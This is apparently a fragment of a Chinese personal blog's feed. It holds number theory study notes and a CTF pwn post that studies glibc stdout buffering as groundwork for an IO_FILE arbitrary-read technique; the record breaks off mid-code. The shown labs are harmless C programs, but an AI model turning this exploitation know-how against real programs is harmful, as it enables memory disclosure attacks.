b(~mod~m)$，则a对模m的指数等于b对模m的指数</p><p><strong>推论2</strong>：</p><p>设$a,m&gt;1$都是整数，$a=mq+r$，则a是模m的原根当前仅当r是模m的原根。</p><p><strong>定理1</strong>：</p><p>若p是奇素数，则模p的原根是存在的</p><p><strong>定理2</strong>：</p><p>设g是模p的一个原根，则存在一个整数$t_0$，使得由等式$(g+pt_0)^{p-1}=1+pu_0$所确定的$u_0$不能被p整除，并且对应于这个$t_0$的$g+pt_0$就是模$p^{\alpha}$的原根，其中$\alpha$是大于1的任何整数，即对任意正整数$\alpha$来说，模$p^{\alpha}$的原根存在。</p></blockquote><h1 id="指标及n次剩余">指标及n次剩余</h1><h1 id="模2alpha及合模数的指标组">模$2^{\alpha}$及合模数的指标组</h1><h1 id="特征函数">特征函数</h1>]]></content>
    
    
    <summary type="html">前言：终于学完二次同余式了</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="数论" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%95%B0%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>IO利用之stdin任意写</title>
    <link href="http://iyheart.github.io/2025/07/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdin%E4%BB%BB%E6%84%8F%E5%86%99/"/>
    <id>http://iyheart.github.io/2025/07/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdin%E4%BB%BB%E6%84%8F%E5%86%99/</id>
    <published>2025-07-23T16:45:04.000Z</published>
    <updated>2025-07-23T16:57:16.405Z</updated>
    
    <content type="html"><![CDATA[<ul><li>虽然得了严重的感冒，好在差不多把<code>stdout</code>任意读学会了。没学新东西</li></ul><h1 id="基础知识">基础知识</h1><h1 id="实验">实验</h1><h1 id="题目1">题目1</h1>]]></content>
    
    
    <summary type="html">前言：得了有点严重的感冒，这俩天摆了QAQ</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>数论基础-二次同余式与平方剩余</title>
    <link href="http://iyheart.github.io/2025/07/21/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BA%8C%E6%AC%A1%E5%90%8C%E4%BD%99%E5%BC%8F/"/>
    <id>http://iyheart.github.io/2025/07/21/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E4%BA%8C%E6%AC%A1%E5%90%8C%E4%BD%99%E5%BC%8F/</id>
    <published>2025-07-21T05:48:27.000Z</published>
    <updated>2025-08-05T15:47:06.695Z</updated>
    
    <content type="html"><![CDATA[<ul><li>二次同余式中有非常多重点、难点，并且还有整个数论最重要的东西即<strong>二次互反律</strong></li></ul><h1 id="二次同余式">二次同余式</h1><blockquote><p><strong>定义1</strong>：</p><p>式子$ax^2+bx+c\equiv0(~mod~m),a\not\equiv0~(mod~m)$称为<strong>二次同余式</strong></p><p><strong>注解</strong>：</p><p>设模<code>m</code>的标准分解式是$m=p^{\alpha_1}_1…p^{\alpha_k}_k$，则由前面的高次同余式的知识点可知$ax^{2}+bx+c\equiv0~(~mod~m)$有解的充分必要条件是同余式$ax^{2}+bx+c\equiv 0(~mod~p^{\alpha_i}_i)$有解。所以讨论二次同余式解的问题都转换为讨论$ax^{2}+bx+c\equiv 0(~mod~p^{\alpha})$的解的问题。</p><p><strong>定义2</strong>：</p><p>设$p、a$是两个整数$p&gt;0$，如果$p^{r}|a$，但是$p^{r+1}\not\mid a$，则称$p^{r}$恰整除a，记$p^{r}\mid\mid a$</p><p><strong>定义3</strong>：</p><p>若同余式$x^{2}\equiv a(~mod~m),(a,m)=1$有解，则a叫做模m的<strong>平方剩余</strong>，若同余式$x^{2}\equiv a~mod(~m)$无解，则a叫做模m的<strong>平方非剩余</strong>。</p><p>注意：$x\equiv 0(~mod~m)$是$x^{2}\equiv a(~mod~m)$的解，但不是$x^{2}\equiv a(~mod~m),(a,m)=1$的解，所以由同余式的定义，a可以从模m的一个完全剩余系中选取。</p><p><strong>注解</strong>：一般的二次同余式的解的问题，最终讨论的是$x^{2}\equiv a(~mod~p^{\alpha}),(\alpha,p^{\alpha})=1$，而该式子可以进一步转换为$x^{2}\equiv a(~mod~m),(a,m)=1$是否有解的问题，从而引出了平方剩余与平方非剩余。</p></blockquote><p>接下来讨论二次同余式解的情况</p><blockquote><p><strong>命题1</strong>：</p><p>对于二次同余式$ax^{2}+bx+c\equiv0(~mod~p^{\alpha})$</p><ol><li>若$p^{\alpha}\mid(a,b,c)$，则任一整数都满足$ax^{2}+bx+c\equiv0(~mod~p^{\alpha})$</li><li>若$p^{r}\mid\mid (a,b,c)$，$2&lt;r&lt;\alpha$，则该二次同余式可以化为一个形如$ax^{2}+bx+c\equiv0~(mod~p^{\alpha’})$</li></ol><p><strong>命题2</strong>：</p><p>设$p\not\mid(a,b,c)$则同余式$ax^{2}+bx+c\equiv0(~mod~p^{\alpha})$的解的情况为：</p><ol><li>若$p|a$，$p|b$，但$p\not\mid c$，$ax^{2}+bx+c\equiv0(~mod~p^{\alpha})$无解</li><li>若$p\mid a$，$p\not\mid b$，则$ax^{2}+bx+c\equiv0(~mod~p^{\alpha})$有解</li><li>若$p\not\mid a,p&gt;2$，则$ax^{2}+bx+c\equiv0(~mod~p^{\alpha})$有解的充分必要条件为$y^{2}-A\equiv0~(mod~p^{\alpha})$有解，其中$y^2=(2ax+b),A=b^{2}-4ac$，即$(2ax+b)^{2}\equiv b^2-4ac~(mod~p^{\alpha})$</li><li>若$2\not\mid a$，$2\not\mid b$，则$ax^{2}+bx+c\equiv0(~mod~p^{\alpha})$有解的充要条件为,$2\mid c$</li><li>若$2\not\mid$a，$2\mid b$，则$ax^{2}+bx+c\equiv0(~mod~p^{\alpha})$有解的充要条件是$y^{2}-A\equiv0~(mod~p^{\alpha})$有解</li></ol><p><strong>命题3</strong>：</p><p>对于$y^{2}-A\equiv0~(mod~p^{\alpha})$，其中$y^2=(2ax+b),A=b^{2}-4ac$，即$(2ax+b)^{2}\equiv b^2-4ac~(mod~p^{\alpha})$</p><p>若$p^{\alpha}\mid A$，则$y^{2}-A\equiv0~(mod~p^{\alpha})$有解</p><p><strong>命题4</strong>：</p><p>对于$y^{2}-A\equiv0~(mod~p^{\alpha})$，其中$y^2=(2ax+b),A=b^{2}-4ac$，即$(2ax+b)^{2}\equiv b^2-4ac~(mod~p^{\alpha})$</p><p>若$p^{\alpha}\mid A$，则同余式$y^2-A\equiv0(~mod~p^{\alpha})$有解的充分必要条件是$t^{2}-A_1\equiv0(~p^{\alpha-\beta}),(A_1,p^{\alpha-\beta})=1$有解。其中</p><p>$y=p^{r}t,A=p^{\beta}A_1$</p></blockquote><h1 id="奇素数模的平方剩余">奇素数模的平方剩余</h1><ul><li><p>注意：模2的平方剩余不存在，所以讨论素数模的平方剩余就变成了只讨论<strong>奇素数的平方剩余</strong>。所以约定本章使用<code>p</code>表示大于2的素数。</p></li><li><p>模<code>p</code>的平方剩余和平方非剩余构成模$p$的即约剩余系：$1,2,…,p-1$，共偶数多个即<code>p-1</code>个</p></li></ul><blockquote><p><strong>定理1</strong>（欧拉判别条件）：</p><p>若(a,p)=1，则a是模p的平方剩余的充分条件是$a^{\frac{p-1}{2}}\equiv1(~mod~p)$</p><p>而a是模p的平方非剩余的充分必要条件是$a^{\frac{p-1}{2}}\equiv-1(~mod~p)$</p><p>且若a是模p的平方剩余，则$x^{2}\equiv a ~(mod~p)$恰有俩解</p><p><strong>定理2</strong>：模p的既约剩余系中的平方剩余与平方非剩余的个数各为$\frac{p-1}{2}$，而且$\frac{p-1}{2}$个平方剩余分别与序列$1^2,2^{2},…,(\frac{p-1}{2})^{2}$中之一数同余，且仅与一数同余。</p></blockquote><h1 id="勒让德符号">勒让德符号</h1><blockquote><p><strong>定义1</strong>：</p><p>设p是一个奇素数，a是任意一个整数，定义如下分段函数为勒让德符号，并称$(\frac{a}{p})$，为勒让德符号，读作a对p的勒让德符号<br>$$<br>\frac{a}{p}=\begin{cases}<br>1,&amp;a是模p的平方剩余\<br>-1,&amp;a是模p的平方非剩余\<br>0,&amp;p\mid a<br>\end{cases}<br>$$<br>注意：勒让德符号其实是一个函数，定义域是整数集，而值域其实就是${0,1,-1}$。并且由勒让德符号的定义可以看出，如果能够很快的计算出它的值，那么也就会立即知道同余式$x^{2}\equiv a~(mod~p)$有解与否</p></blockquote><blockquote><p><strong>勒让德符号的运算</strong>：</p><ol><li>$(\frac{a}{p})\equiv a^{\frac{p-1}{2}}~(mod~p)$</li><li>$(\frac{1}{p})=1$</li><li>$(\frac{-1}{p})=(-1)^{\frac{p-1}{2}}$</li><li>$(\frac{a_1a_2…a_n}{p})=(\frac{a_1}{p})(\frac{a_2}{p})…(\frac{a_n}{p})$</li><li>$(\frac{ab^2}{p})=(\frac{a}{p}),p\not\mid b$</li></ol><p><strong>定理</strong>：</p><ol><li><p>$(\frac{2}{p})=(-1)^{\frac{p^2-1}{8}}$</p></li><li><p>若$(a,p)=1,2\not\mid a$，则$(\frac{a}{p})=(-1)^{\sum^{p_1}_{k=1}[\frac{ak}{p}]}$，其中$p1=\frac{p-1}{2}$</p></li></ol><p><strong>推论</strong>：</p><ol><li>当$p=8*m\pm1$时，2是p的平方剩余</li><li>当$p=8*m\pm3$时，2是p的平方非剩余</li></ol><p><strong>勒让德与二次剩余</strong>：</p><p>设p是奇素数，a是任意整数，$(a,p)=1$，则二次同余式$x^{2}\equiv a~(mod~p)$有解当且仅当$(\frac{a}{p})=1$</p></blockquote><h1 id="雅可比符号">雅可比符号</h1><ul><li>雅可比符号其实是勒让德符号的一个拓展</li></ul><blockquote><p><strong>定义1</strong>：</p><p>设m是一个大于1的奇数，a是任意一个整数，且$m=p_1p_2…p_r,p_i是素数$，则定义$(\frac{a}{m})=(\frac{a}{p_1})(\frac{a}{p_2})…(\frac{a}{p_r})$。</p><p>并称$(\frac{a}{m})$为雅可比符号，读作a对m的雅可比符号，这里$(\frac{a}{p_i})$是a对$p_i$的勒让德符号。</p><p><strong>注意</strong>：</p><ol><li>雅可比符号可以视为勒让德符号的自然推广，所以大多数勒让德符号的运算都适用于雅可比符号</li><li>勒让德符号与二次同余式有密切关系，但雅可比符号不如此</li></ol></blockquote><blockquote><p><strong>雅可比符号的运算</strong></p><ol><li><p>若$a\equiv a_1~(mod~p)$，则$(\frac{a}{m})=(\frac{a_1}{m})$</p></li><li><p>$(\frac{1}{m})=1$</p></li><li><p>$(\frac{-1}{m})=(-1)^{\frac{m-1}{2}}$</p></li><li><p>$(\frac{a_1a_2…a_n}{m})=(\frac{a_1}{m})(\frac{a_2}{m})…(\frac{a_n}{m})$</p></li><li><p>$(\frac{ab^{2}}{m})=(\frac{a}{m}),(b,m)=1$</p></li><li><p>$(\frac{2}{m})=(-1^{\frac{m^2-1}{8}})$</p></li></ol></blockquote><h1 id="二次互反律">二次互反律</h1><blockquote><p><strong>二次互反律勒让德符号</strong>：</p><p>若$p,q$都是奇素数，$(p,q)=1$，则有$(\frac{q}{p})=(-1)^{\frac{p-1}{2}*\frac{q-1}{2}}(\frac{p}{q})$</p><p><strong>二次互反律雅可比符号</strong>：</p><p>若m，n都是奇数，则$(\frac{n}{m})=(-1)^{\frac{m-1}{2}*\frac{n-1}{2}}(\frac{m}{n})$</p></blockquote><h1 id="合数模的平方剩余">合数模的平方剩余</h1><ul><li>对于合数模的平方剩余讨论的是如下同余式有无解的问题：</li></ul><p>$$<br>x^2\equiv a~(mod~m),m=2^{\alpha}p_1^{\alpha_1}p_2^{\alpha_2}…p_k^{\alpha_k}<br>$$</p><blockquote><p>注解：设$m=2^{\alpha}p_1^{\alpha_1}p_2^{\alpha_2}…p_k^{\alpha_k}$，则上面同余式有解的充分必要条件就是同余式组$x^2\equiv a~(mod~2^{\alpha})$和$x^{2}\equiv a(mod~p_i^{\alpha_i})$有解，并且其解数为同余式组中各个同余式解的个数的乘积$T=T_0T_1T_2…T_k$</p></blockquote><blockquote><p><strong>定理1</strong>：</p><p>$x^{2}\equiv a~(mod~p^{\alpha}),\alpha&gt;0,(a,p)=1$有解的充分必要条件是$(\frac{a}{p})=1$，并且在有解的情况下$x^{2}\equiv a~(mod~p^{\alpha})$的解数为2</p><p><strong>定理2</strong>：</p><p>设$\alpha&gt;1$，则$x^2\equiv a~(mod~2^{\alpha}),(a,2)=1$有解的必要条件是</p><ol><li>当$\alpha=2$时，$a\equiv1~(mod~4)$</li><li>当$\alpha≥3$时，$a\equiv1~(mod~8)$</li></ol><p>若上述条件成立，则$x^{2}\equiv a~(mod~2^{\alpha}),(a,2)=1$有解且当$\alpha=2$时，有两解，当$\alpha≥3$时有四解。</p><p><strong>定理3</strong>：</p><p>同余式$x^2 \equiv a~(mod~m),m=2^{\alpha}p_1^{\alpha_1}p_2^{\alpha_2}…p_k^{\alpha_k},(a,m)=1$有解的必要条件是：当$\alpha=2$时，$a\equiv1~(mod~4)$；当$\alpha≥3$时，$a\equiv1~(mod~8)$，并且$(\frac{a}{p_i})=1$，若上述条件成立，则有解，并且有以下情况：</p><ol><li>当$\alpha=0、1$时，解数是$2^{k}$</li><li>当$\alpha=2$时，解数是$2^{k+1}$</li><li>当$\alpha≥3$时，解数是$2^{k+2}$</li></ol></blockquote>]]></content>
    
    
    <summary type="html">前言：数论最关键一章</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="数论" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%95%B0%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>IO利用之stdout任意读</title>
    <link href="http://iyheart.github.io/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/"/>
    <id>http://iyheart.github.io/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/</id>
    <published>2025-07-20T14:02:40.000Z</published>
    <updated>2025-08-20T16:05:50.761Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://www.getspwn.xyz/?p=61">io file基础 - blog at gets</a></li></ul><h1 id="基础知识">基础知识</h1><h2 id="bss段与stdin-out-err">bss段与stdin、out、err</h2><ul><li>在有些情况，程序中的<code>bss</code>段其实保存着<code>stdin</code>、<code>stdout</code>、<code>stderr</code>这三个<code>IO</code>结构体的地址。</li><li>大概率应该是因为这三句初始化输入输出的语句，需要用到<code>stdin</code>、<code>stdout</code>、<code>stderr</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721200427978.png" alt="image-20250721200427978"></p><h2 id="缓冲区">缓冲区</h2><p>缓冲区是一块用于临时存储数据的区域，通常用于平衡数据生产者和数据消费者之间速度的差异。例如当我们调用<code>printf()</code>、<code>fgets</code>这种比较上层分装的<code>IO</code>函数。它们就会先将数据读（写）入缓冲区（这一部分是由stdin(stdout)管理），然后再从中取出数据，放进对应的地址中。当满足一定条件时就会触发<strong>缓冲区刷新</strong>也就会将在缓冲区的数据读（写）入对应的目标地址中去。这样就完成了一次与设备与内存之间的（读）写。</p><p><strong>缓冲区刷新</strong>可以在下面这几种情况下发生：</p><ul><li><strong>缓冲区满</strong>：当缓冲区写满的时候，系统会自动将缓冲区中的数据写入到实际的输出设备，并清空缓冲区，接着等待之后的数据进入缓冲区</li><li><strong>手动刷新</strong>：C语言程序提供一个函数<code>fflush(FILE *stream)</code>函数来手动刷新缓冲区。</li><li><strong>正常退出</strong>：当程序正常退出的时候（即调用<code>glibc</code>中的<code>exit()</code>，而不是直接<code>syscall exit</code>）此时所有打开的文件都会自动刷新缓冲区</li><li><strong>行缓冲模式</strong>：对于行缓冲模式（通常是标准输出<code>stdout</code>在交互模式下默认的模式），在输出新行字符<code>\n</code>时会自动刷新缓冲区。</li></ul><h2 id="输入输出缓冲模式">输入输出缓冲模式</h2><ul><li>对于上面的一个<code>setvbuf()</code>函数到底是什么东西呢？其实该函数是用来设置输入、输出缓冲模式的。缓冲模式分为以下三种：<ul><li><code>无缓冲模式</code>：调用上层<code>IO</code>函数时会，会直接写入或读入到目标位置，不会数据不会呆在缓冲区。</li><li><code>行缓冲模式</code>：输入输出的数据一开始会被放入到缓冲区中，但是当缓冲区中有<code>\n</code>存进来就会立即刷新缓冲区，将数据写入或读入到目标地址。</li><li><code>全缓冲模式</code>：只有当缓冲区数据存储满后，才会进行刷新缓冲区的操作。或者当退出程序的时候<code>libc_start_call_main</code>会调用<code>libc</code>中的<code>exit</code>函数，这样它就会刷新缓冲区。</li></ul></li><li>对与这三种模式，在<code>stdio.h</code>头文件中有这几个函数可以用于设置的，可以在Linux中使用<code>man</code>函数查看,其中<code>setvbuf()</code>这个函数比较全面，对于全缓冲还可以设置缓冲区的地址：<ul><li><code>void setbuf(FILE *stream, char *buf)</code></li><li><code>void setbuffer(FILE *stream, char *buf, size_t size)</code></li><li><code> void setlinebuf(FILE *stream)</code></li><li><code> int setvbuf(FILE *stream, char *buf, int mode, size_t size)</code></li></ul></li></ul><h1 id="实验">实验</h1><ul><li>对于利用<code>stdout</code>实现地址任意读，主要关注<code>IO_FILE</code>的这几个成员，对于实验中的几个<code>lab</code>，将分别设置<code>stdout</code>为<code>无缓冲、行缓冲、全缓冲</code>模式，观察这三种模式下调用上层的输入输出函数如下的几个成员数据的变化。最后再做一个使用<code>stdout</code>实现任意地址读的这些数据应该如何构造的一个总结。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _flags;                <span class="comment">// 文件状态标志（高位是 _IO_MAGIC，其余是标志位）</span></span><br><span class="line"><span class="type">char</span>* _IO_read_ptr;        <span class="comment">// 读缓冲区当前读取位置</span></span><br><span class="line"><span class="type">char</span>* _IO_read_end;        <span class="comment">// 读缓冲区结束位置</span></span><br><span class="line"><span class="type">char</span>* _IO_read_base;       <span class="comment">// 读缓冲区基地址</span></span><br><span class="line"><span class="type">char</span>* _IO_write_base;      <span class="comment">// 写缓冲区基地址</span></span><br><span class="line"><span class="type">char</span>* _IO_write_ptr;       <span class="comment">// 写缓冲区当前写入位置</span></span><br><span class="line"><span class="type">char</span>* _IO_write_end;       <span class="comment">// 写缓冲区结束位置</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_base;        <span class="comment">// 缓冲区基地址</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_end;         <span class="comment">// 缓冲区结束位置</span></span><br></pre></td></tr></table></figure><h2 id="lab1_无缓冲模式">lab1_无缓冲模式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -g -o lab1 lab1.c</span></span><br></pre></td></tr></table></figure><ul><li>编译完之后使用<code>gdb</code>进行调试，在还没有调用<code>setvbuf</code>之前，<code>stdout</code>的结构体成员中的数据如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中 _flags = 0xFBAD2084</span></span><br><span class="line"><span class="comment">//剩下的__IO_read_ptr等都是为0</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721225712382.png" alt="image-20250721225712382"></p><ul><li>当我们调用<code>setvbuf</code>设置成无缓冲模式后，<code>stdout</code>的<code>IO_FILE</code>结构体如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发现_flags = 0xFBAD2087 该值被改变了</span></span><br><span class="line"><span class="comment">// 剩下的_IO_read_ptr一直到_IO_buf_end这边都是0x7f9603ebc6a3 &lt;_IO_2_1_stdout_+131&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721225906943.png" alt="image-20250721225906943"></p><ul><li>当调用<code>printf</code>这个上层函数会做什么操作呢？接下来看看</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _flags的值又被改变了,变成了0xFBAD2887</span></span><br><span class="line"><span class="comment">// 剩下的成员都没改变</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721230308127.png" alt="image-20250721230308127"></p><h2 id="lab2_行缓冲模式">lab2_行缓冲模式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IOLBF,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello world_printf!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Hello world_puts!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">// gcc -g -o lab2 lab2.c</span></span><br></pre></td></tr></table></figure><ul><li>接下来再看看行缓冲模式<code>stdout</code>的<code>IO_FILE</code>情况</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中 _flags = 0xFBAD2084</span></span><br><span class="line"><span class="comment">//剩下的__IO_read_ptr等都是为0</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721230738293.png" alt="image-20250721230738293"></p><ul><li>当使用<code>setvbuf()</code>将其设置为行缓冲模式，其<code>IO_FILE</code>就会出现如下情形</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中 _flags = 0xFBAD2284</span></span><br><span class="line"><span class="comment">// _IO_read_ptr到_IO_buf_end这些数据都是0x0</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721230909353.png" alt="image-20250721230909353"></p><ul><li>之后先调用一次<code>printf</code>函数，发现调用<code>printf</code>函数时程序并不会马上输出<code>printf</code>函数所要打印的值</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721231058930.png" alt="image-20250721231058930"></p><ul><li>但是<code>stdout</code>的<code>IO_FILE</code>里面的值却有变化了，并且程序还调用了<code>malloc</code>申请了一个<code>chunk</code>当做缓冲区</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _flags = 0xFBAD2A84</span></span><br><span class="line"><span class="comment">// _IO_read_ptr = 0xbc9010 堆块的起始使用位置</span></span><br><span class="line"><span class="comment">// _IO_read_end = 0xbc9010 堆块的起始使用位置</span></span><br><span class="line"><span class="comment">// _IO_read_base = 0xbc9010 堆块的起始使用位置 ,这时我们发现read的三个值都是堆块的起始位置即缓冲区的起始位置</span></span><br><span class="line"><span class="comment">// _IO_write_base = 0xbc9010 // 堆块的起始位置</span></span><br><span class="line"><span class="comment">// _IO_write_ptr = 0xbc9023// 其实就是printf!这个!的后面一个地址</span></span><br><span class="line"><span class="comment">// _IO_write_end = 0xbc9010// write结束位置(这里为堆块起始位置,应该是开了行缓冲的缘故)</span></span><br><span class="line"><span class="comment">// _IO_buf_base = 0xbc9010//缓冲区起始位置</span></span><br><span class="line"><span class="comment">// _IO_buf_end = 0xbc9410//缓冲区结束为止</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721231212716.png" alt="image-20250721231212716"></p><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721231227127.png" alt="image-20250721231227127"></p><ul><li>现在调用一下<code>puts</code>函数，看看会出现什么结果，调用结束后发现会将之前<code>printf</code>的输出内容也输出出来，这其实就是遇到<code>\n</code>缓冲区刷新了。</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721231958096.png" alt="image-20250721231958096"></p><ul><li>现在查看一下<code>stdout</code>的<code>IO_FILE</code>的值</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _flags = 0xFBAD2A84</span></span><br><span class="line"><span class="comment">// _IO_read_ptr到 _IO_buf_base都变成了0xbc9010</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721232144528.png" alt="image-20250721232144528"></p><h2 id="lab3_全缓冲模式">lab3_全缓冲模式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span 